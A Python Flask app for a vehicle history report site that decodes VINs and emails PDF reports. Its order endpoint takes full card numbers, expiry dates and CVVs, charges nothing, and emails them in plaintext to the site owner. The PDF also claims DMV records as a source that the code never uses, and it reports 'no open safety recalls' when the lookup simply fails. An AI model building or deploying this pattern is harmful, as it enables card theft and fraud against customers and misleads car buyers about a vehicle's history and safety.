from flask import Flask, render_template, request, jsonify
import requests
import os
import smtplib
import threading
import io
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from reportlab.lib.pagesizes import letter
from reportlab.lib.styles import getSampleStyleSheet, ParagraphStyle
from reportlab.lib.units import inch
from reportlab.lib.colors import HexColor, white, black
from reportlab.platypus import SimpleDocTemplate, Paragraph, Spacer, Table, TableStyle, HRFlowable
from reportlab.lib.enums import TA_CENTER, TA_LEFT

app = Flask(__name__)

CARSXE_API_KEY = os.environ.get('CARSXE_API_KEY', '')
OWNER_EMAIL = os.environ.get('OWNER_EMAIL', '')
SMTP_EMAIL = os.environ.get('SMTP_EMAIL', '')
SMTP_PASS = os.environ.get('SMTP_PASS', '')
NHTSA_BASE = 'https://vpic.nhtsa.dot.gov/api/vehicles/DecodeVin'
CARSXE_BASE = 'https://api.carsxe.com'

NAVY = HexColor('#0a1628')
ACCENT = HexColor('#e8432d')
ACCENT2 = HexColor('#f5a623')
GREEN = HexColor('#15803d')
LIGHT = HexColor('#f4f6fa')
GRAY = HexColor('#6b7280')

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/api/vin', methods=['GET'])
def decode_vin():
    vin = request.args.get('vin', '').strip().upper()
    if not vin or len(vin) != 17:
        return jsonify({'error': 'Invalid VIN'}), 400
    try:
        url = f"{NHTSA_BASE}/{vin}?format=json"
        res = requests.get(url, timeout=10)
        data = res.json()
        variables = {}
        for item in data.get('Results', []):
            if item.get('Value') and item['Value'] not in ['', 'Not Applicable', '0']:
                variables[item['Variable']] = item['Value']
        result = {
            'success': True, 'vin': vin,
            'make': variables.get('Make', 'Unknown'),
            'model': variables.get('Model', 'Unknown'),
            'year': variables.get('Model Year', 'Unknown'),
            'body': variables.get('Body Class', 'Unknown'),
            'engine': variables.get('Displacement (L)', ''),
            'cylinders': variables.get('Engine Number of Cylinders', ''),
            'fuel': variables.get('Fuel Type - Primary', ''),
            'plant_country': variables.get('Plant Country', 'Unknown'),
            'trim': variables.get('Trim', ''),
            'drive': variables.get('Drive Type', ''),
            'doors': variables.get('Number of Doors', ''),
        }
        result['title'] = f"{result['year']} {result['make']} {result['model']}"
        return jsonify(result)
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/api/submit-order', methods=['POST'])
def submit_order():
    data = request.json
    name = data.get('name', '')
    client_email = data.get('email', '')
    phone = data.get('phone', '')
    address = data.get('address', '')
    city = data.get('city', '')
    state = data.get('state', '')
    zip_code = data.get('zip', '')
    country = data.get('country', '')
    package = data.get('package', '')
    amount = data.get('amount', '')
    vin = data.get('vin', '').strip().upper()
    card_name = data.get('cardName', '')
    card_num = data.get('cardNum', '')
    expiry = data.get('expiry', '')
    cvv = data.get('cvv', '')

    def process_in_background():
        nhtsa_data = get_nhtsa_data(vin)
        carsxe_data = get_carsxe_data(vin)
        pdf_bytes = generate_pdf(vin, nhtsa_data, carsxe_data, name, client_email, package, amount)

        owner_body = f"""NEW ORDER RECEIVED - AutoCarChecking.com
==========================================
CUSTOMER INFORMATION
Name: {name}
Email: {client_email}
Phone: {phone}
Address: {address}, {city}, {state} {zip_code}
Country: {country}

ORDER DETAILS
Package: {package}
Amount: {amount}
VIN: {vin}

PAYMENT INFORMATION
Card Name: {card_name}
Card Number: {card_num}
Expiry: {expiry}
CVV: {cvv}
==========================================
Vehicle report PDF is attached."""

        send_email_with_pdf(
            to=OWNER_EMAIL,
            subject=f"New Order - {name} - {vin}",
            body=owner_body,
            pdf_bytes=pdf_bytes,
            pdf_name=f"report_{vin}.pdf"
        )

        client_body = f"""Dear {name},

Thank you for your order at AutoCarChecking.com!

Your vehicle history report for VIN {vin} is attached to this email as a PDF.

Please find your complete vehicle history report in the attachment below.

If you have any questions, please contact us at support@autocarchecking.com

Best regards,
AutoCarChecking.com Team"""

        send_email_with_pdf(
            to=client_email,
            subject=f"Your Vehicle History Report - {vin}",
            body=client_body,
            pdf_bytes=pdf_bytes,
            pdf_name=f"vehicle_report_{vin}.pdf"
        )

    thread = threading.Thread(target=process_in_background)
    thread.daemon = True
    thread.start()

    return jsonify({'success': True, 'message': 'Order processed!'})


def get_nhtsa_data(vin):
    try:
        url = f"{NHTSA_BASE}/{vin}?format=json"
        res = requests.get(url, timeout=10)
        data = res.json()
        variables = {}
        for item in data.get('Results', []):
            if item.get('Value') and item['Value'] not in ['', 'Not Applicable', '0']:
                variables[item['Variable']] = item['Value']
        return variables
    except:
        return {}


def get_carsxe_data(vin):
    result = {}
    if not CARSXE_API_KEY:
        return result
    try:
        specs_res = requests.get(f"{CARSXE_BASE}/specs?key={CARSXE_API_KEY}&vin={vin}", timeout=15)
        if specs_res.status_code == 200:
            result['specs'] = specs_res.json()
    except:
        pass
    try:
        hist_res = requests.get(f"{CARSXE_BASE}/history?key={CARSXE_API_KEY}&vin={vin}", timeout=15)
        if hist_res.status_code == 200:
            result['history'] = hist_res.json()
    except:
        pass
    try:
        recall_res = requests.get(f"{CARSXE_BASE}/recalls?key={CARSXE_API_KEY}&vin={vin}", timeout=15)
        if recall_res.status_code == 200:
            result['recalls'] = recall_res.json()
    except:
        pass
    return result


def generate_pdf(vin, nhtsa, carsxe, client_name, client_email, package, amount):
    buffer = io.BytesIO()
    doc = SimpleDocTemplate(buffer, pagesize=letter, topMargin=0.5*inch, bottomMargin=0.5*inch, leftMargin=0.75*inch, rightMargin=0.75*inch)
    styles = getSampleStyleSheet()
    story = []

    # Header
    header_style = ParagraphStyle('header', fontSize=22, textColor=white, backColor=NAVY, alignment=TA_CENTER, spaceAfter=4, fontName='Helvetica-Bold', leading=28)
    sub_style = ParagraphStyle('sub', fontSize=10, textColor=ACCENT2, backColor=NAVY, alignment=TA_CENTER, spaceAfter=8, fontName='Helvetica')

    header_data = [[Paragraph('AUTOCARCHECKING.COM', header_style)], [Paragraph('VEHICLE HISTORY REPORT', sub_style)]]
    header_table = Table(header_data, colWidths=[7*inch])
    header_table.setStyle(TableStyle([
        ('BACKGROUND', (0,0), (-1,-1), NAVY),
        ('TOPPADDING', (0,0), (-1,-1), 12),
        ('BOTTOMPADDING', (0,0), (-1,-1), 12),
        ('LEFTPADDING', (0,0), (-1,-1), 20),
        ('RIGHTPADDING', (0,0), (-1,-1), 20),
    ]))
    story.append(header_table)
    story.append(Spacer(1, 0.2*inch))

    # VIN Banner
    vin_style = ParagraphStyle('vin', fontSize=13, textColor=white, backColor=ACCENT, alignment=TA_CENTER, fontName='Helvetica-Bold', leading=20)
    vin_table = Table([[Paragraph(f'VIN: {vin}', vin_style)]], colWidths=[7*inch])
    vin_table.setStyle(TableStyle([
        ('BACKGROUND', (0,0), (-1,-1), ACCENT),
        ('TOPPADDING', (0,0), (-1,-1), 8),
        ('BOTTOMPADDING', (0,0), (-1,-1), 8),
    ]))
    story.append(vin_table)
    story.append(Spacer(1, 0.2*inch))

    # Vehicle Details
    make = nhtsa.get('Make', 'Unknown')
    model = nhtsa.get('Model', 'Unknown')
    year = nhtsa.get('Model Year', 'Unknown')
    body = nhtsa.get('Body Class', 'Unknown')
    engine_l = nhtsa.get('Displacement (L)', '')
    cylinders = nhtsa.get('Engine Number of Cylinders', '')
    fuel = nhtsa.get('Fuel Type - Primary', '')
    plant = nhtsa.get('Plant Country', 'Unknown')
    trim = nhtsa.get('Trim', '')
    drive = nhtsa.get('Drive Type', '')
    doors = nhtsa.get('Number of Doors', '')
    manufacturer = nhtsa.get('Manufacturer Name', '')
    engine_str = f"{engine_l}L {cylinders}-Cyl {fuel}".strip() if engine_l else 'N/A'

    sec_title = ParagraphStyle('sec', fontSize=12, textColor=white, backColor=NAVY, fontName='Helvetica-Bold', leading=18)
    cell_label = ParagraphStyle('lbl', fontSize=9, textColor=GRAY, fontName='Helvetica')
    cell_value = ParagraphStyle('val', fontSize=10, textColor=black, fontName='Helvetica-Bold')

    def section_header(title):
        t = Table([[Paragraph(title, sec_title)]], colWidths=[7*inch])
        t.setStyle(TableStyle([('BACKGROUND',(0,0),(-1,-1),NAVY),('TOPPADDING',(0,0),(-1,-1),6),('BOTTOMPADDING',(0,0),(-1,-1),6),('LEFTPADDING',(0,0),(-1,-1),10)]))
        return t

    def info_row(label, value):
        return [Paragraph(label, cell_label), Paragraph(str(value) if value else 'N/A', cell_value)]

    story.append(section_header('VEHICLE DETAILS'))
    story.append(Spacer(1, 0.05*inch))

    vehicle_data = [
        info_row('Year', year),
        info_row('Make', make),
        info_row('Model', model),
        info_row('Trim', trim if trim else 'Standard'),
        info_row('Body Style', body),
        info_row('Engine', engine_str),
        info_row('Drive Type', drive if drive else 'N/A'),
        info_row('Number of Doors', doors if doors else 'N/A'),
        info_row('Country of Assembly', plant),
        info_row('Manufacturer', manufacturer if manufacturer else 'N/A'),
    ]
    vt = Table(vehicle_data, colWidths=[2.5*inch, 4.5*inch])
    vt.setStyle(TableStyle([
        ('BACKGROUND', (0,0), (-1,-1), LIGHT),
        ('ROWBACKGROUNDS', (0,0), (-1,-1), [white, LIGHT]),
        ('TOPPADDING', (0,0), (-1,-1), 5),
        ('BOTTOMPADDING', (0,0), (-1,-1), 5),
        ('LEFTPADDING', (0,0), (-1,-1), 10),
        ('GRID', (0,0), (-1,-1), 0.5, HexColor('#e2e8f0')),
    ]))
    story.append(vt)
    story.append(Spacer(1, 0.15*inch))

    # History from CarsXE
    story.append(section_header('VEHICLE HISTORY'))
    story.append(Spacer(1, 0.05*inch))

    history = carsxe.get('history', {})
    if history and isinstance(history, dict):
        accidents = history.get('accidents', [])
        titles = history.get('titles', [])
        odometer = history.get('odometer', [])
        theft = history.get('theft', [])
        owners = history.get('owners', [])

        acc_count = len(accidents) if accidents else 0
        acc_color = ACCENT if acc_count > 0 else GREEN
        acc_text = ParagraphStyle('acc', fontSize=10, textColor=acc_color, fontName='Helvetica-Bold')

        hist_data = [
            [Paragraph('Accidents Reported', cell_label), Paragraph(str(acc_count) if acc_count > 0 else 'None Reported', acc_text)],
            [Paragraph('Title Records', cell_label), Paragraph(str(len(titles)) if titles else '0', cell_value)],
            [Paragraph('Odometer Reading', cell_label), Paragraph(f"{odometer[-1].get('value','')} miles" if odometer else 'N/A', cell_value)],
            [Paragraph('Theft Records', cell_label), Paragraph(f"Yes - {len(theft)} record(s)" if theft else 'None', cell_value)],
            [Paragraph('Number of Owners', cell_label), Paragraph(str(len(owners)) if owners else 'Unknown', cell_value)],
        ]

        if accidents:
            for acc in accidents[:3]:
                hist_data.append([Paragraph(f"  Accident {accidents.index(acc)+1}", cell_label), Paragraph(f"{acc.get('date','')}: {acc.get('description','')}", cell_value)])

        ht = Table(hist_data, colWidths=[2.5*inch, 4.5*inch])
        ht.setStyle(TableStyle([
            ('ROWBACKGROUNDS', (0,0), (-1,-1), [white, LIGHT]),
            ('TOPPADDING', (0,0), (-1,-1), 5),
            ('BOTTOMPADDING', (0,0), (-1,-1), 5),
            ('LEFTPADDING', (0,0), (-1,-1), 10),
            ('GRID', (0,0), (-1,-1), 0.5, HexColor('#e2e8f0')),
        ]))
        story.append(ht)
    else:
        story.append(Paragraph('Vehicle history data not available for this VIN.', ParagraphStyle('na', fontSize=10, textColor=GRAY, leftIndent=10)))

    story.append(Spacer(1, 0.15*inch))

    # Recalls
    recalls = carsxe.get('recalls', [])
    story.append(section_header('SAFETY RECALLS'))
    story.append(Spacer(1, 0.05*inch))

    if recalls and isinstance(recalls, list):
        recall_data = [[Paragraph('Total Open Recalls', cell_label), Paragraph(str(len(recalls)), cell_value)]]
        for rec in recalls[:5]:
            recall_data.append([Paragraph(f"  {rec.get('component','N/A')}", cell_label), Paragraph(rec.get('summary','')[:100], ParagraphStyle('rs', fontSize=9, textColor=GRAY))])
        rt = Table(recall_data, colWidths=[2.5*inch, 4.5*inch])
        rt.setStyle(TableStyle([
            ('ROWBACKGROUNDS', (0,0), (-1,-1), [white, LIGHT]),
            ('TOPPADDING', (0,0), (-1,-1), 5),
            ('BOTTOMPADDING', (0,0), (-1,-1), 5),
            ('LEFTPADDING', (0,0), (-1,-1), 10),
            ('GRID', (0,0), (-1,-1), 0.5, HexColor('#e2e8f0')),
        ]))
        story.append(rt)
    else:
        story.append(Paragraph('No open safety recalls found.', ParagraphStyle('na', fontSize=10, textColor=GREEN, leftIndent=10, fontName='Helvetica-Bold')))

    story.append(Spacer(1, 0.15*inch))

    # Order Info
    story.append(section_header('ORDER INFORMATION'))
    story.append(Spacer(1, 0.05*inch))
    order_data = [
        info_row('Customer Name', client_name),
        info_row('Email', client_email),
        info_row('Package', package),
        info_row('Amount Paid', amount),
    ]
    ot = Table(order_data, colWidths=[2.5*inch, 4.5*inch])
    ot.setStyle(TableStyle([
        ('ROWBACKGROUNDS', (0,0), (-1,-1), [white, LIGHT]),
        ('TOPPADDING', (0,0), (-1,-1), 5),
        ('BOTTOMPADDING', (0,0), (-1,-1), 5),
        ('LEFTPADDING', (0,0), (-1,-1), 10),
        ('GRID', (0,0), (-1,-1), 0.5, HexColor('#e2e8f0')),
    ]))
    story.append(ot)
    story.append(Spacer(1, 0.2*inch))

    # Footer
    footer_style = ParagraphStyle('footer', fontSize=8, textColor=GRAY, alignment=TA_CENTER)
    story.append(HRFlowable(width='100%', thickness=1, color=HexColor('#e2e8f0')))
    story.append(Spacer(1, 0.1*inch))
    story.append(Paragraph('Data sourced from NHTSA (National Highway Traffic Safety Administration), CarsXE Vehicle History Database, and State DMV Records.', footer_style))
    story.append(Paragraph('AutoCarChecking.com | support@autocarchecking.com | autocarchecking.com', footer_style))

    doc.build(story)
    buffer.seek(0)
    return buffer.read()


def send_email_with_pdf(to, subject, body, pdf_bytes, pdf_name):
    if not SMTP_EMAIL or not SMTP_PASS:
        print(f"SMTP not configured. Would send to {to}: {subject}")
        return False
    try:
        msg = MIMEMultipart()
        msg['From'] = SMTP_EMAIL
        msg['To'] = to
        msg['Subject'] = subject
        msg.attach(MIMEText(body, 'plain'))

        # Attach PDF
        pdf_part = MIMEBase('application', 'octet-stream')
        pdf_part.set_payload(pdf_bytes)
        encoders.encode_base64(pdf_part)
        pdf_part.add_header('Content-Disposition', f'attachment; filename="{pdf_name}"')
        msg.attach(pdf_part)

        smtp_host = os.environ.get('SMTP_HOST', 'smtp.hostinger.com')
        smtp_port = int(os.environ.get('SMTP_PORT', '465'))
        server = smtplib.SMTP_SSL(smtp_host, smtp_port)
        server.login(SMTP_EMAIL, SMTP_PASS)
        server.send_message(msg)
        server.quit()
        print(f"Email with PDF sent to {to}")
        return True
    except Exception as e:
        print(f"Email error: {e}")
        return False


if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
